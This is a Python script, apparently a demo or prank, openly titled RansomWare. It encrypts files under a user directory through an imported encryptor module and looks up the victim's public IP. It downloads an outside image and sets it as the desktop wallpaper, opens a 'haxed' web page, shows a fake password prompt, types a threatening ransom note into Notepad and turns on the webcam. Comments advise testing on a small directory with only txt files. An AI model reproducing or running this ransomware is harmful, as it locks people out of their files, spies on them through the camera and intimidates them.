#!/usr/bin/env python3
import os
import webbrowser
import requests
import urllib
import ctypes
import encryptor
import threading
import tkinter as tk
import cv2
import signal
import time
import pyautogui

# File exstensions to seek out and Encrypt
"""
    CAUTION: start with something crazy like bananas
"""
extensions = [
    "txt",
]


class RansomWare:

    def __init__(self):
        self.public_key = None

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.attemps = 0
        self.sysRoot = os.path.expanduser('~\\test')

        self.system_encrypted = self.check_encrypted()

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get('https://api.ipify.org').text
        print(f"[IP ADDRESS] {self.publicIP}")
        print(f"[SYS ROOT] {self.sysRoot}")
        self.start_attack()

    def start_attack(self):
        try:
            self.popup()
            self.open_browser()
            self.paint()
            self.take_picture()
            self.change_desktop_background()
            self.encryptSystem()
        except Exception as error:
            print(error)

    def change_desktop_background(self):
        imageUrl = 'https://atlasworlds.blob.core.windows.net/media/joverall22__QGdtYWlsLmNvbQ==/1e09dad7-c74a-4d85-89d0-82c342c50ed7.png'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, path, 0)

    def open_browser(self):
        webbrowser.open('https://jakeoverall.github.io/haxed', new=1)

    def encryptSystem(self):
        if not self.system_encrypted:
            encryptor.encryptDirectory(self.sysRoot, extensions)
            open(".encrypted", "wb").write("HAXED".encode())
        else:
            encryptor.decryptDirectory(self.sysRoot, extensions)
            os.remove(".encrypted")

    def popup(self):
        screenWidth, screenHeight = pyautogui.size()
        currentMouseX, currentMouseY = pyautogui.position()
        notepad = "C:\WINDOWS\system32\\notepad.exe"

        pw = pyautogui.password(
            "To save your computer enter the correct password", mask="*")
        if(pw == "help"):
            pyautogui.alert('CONGRATS YOU GOT IT RIGHT', "HAXED")
            pyautogui.alert(" Okay, Bye 👋 ", "HAXED")
            quit()
        else:
            pyautogui.alert('SORRY BUT THAT JUST WONT DO', "HAXED")
            os.startfile(notepad)
            time.sleep(2)
            pyautogui.write(f"""
YOU HAVE BEEN HAXED

Listen we know it sucks but thanks for letting us in.... 
as you are busy reading this you are being locked out of your files.... 
There is no way for you to stop us. 

Much like the proverbial vampire once you invited us in we are free to come and go as we please.

Make Better Choices
We can take your picture

We can see your history... no incognito mode doesn't stop us

We know your passwords! 

And most importantly we know you!!!

            """, interval=0.05)

    def paint(self):
        paint_path = "C:\WINDOWS\system32\mspaint.exe"
        os.startfile(paint_path)
        # wait for paint to start
        time.sleep(2)

        distance = 200
        while distance > 0:
            pyautogui.drag(distance, 0, duration=0.15)   # move right
            distance -= 10
            pyautogui.drag(0, distance, duration=0.15)   # move down
            pyautogui.drag(-distance, 0, duration=0.15)  # move left
            distance -= 10
            pyautogui.drag(0, -distance, duration=0.15)

    def take_picture(self):
        try:
            self.attemps += 1
            vid = cv2.VideoCapture(1)
            while self.attemps < 5:
                ret, frame = vid.read()
                cv2.imshow('👁 see you', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break

            vid.release()
            cv2.destroyAllWindows()

            if self.attemps < 2:
                time.sleep(2)
                self.take_picture()

        except Exception as err:
            print(err)

    def check_encrypted(self):
        """
            Loads the key from the current directory named `key.key`
        """
        try:
            written = open(".encrypted", "rb").read()
            return True if written else False
        except:
            return False


def main():
    try:
        RansomWare()
    except Exception as err:
        print(err)


def quit():
    print(" Okay, Bye 👋 ")
    exit(0)


def signal_handler(signal, frame):
    quit()


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    main()
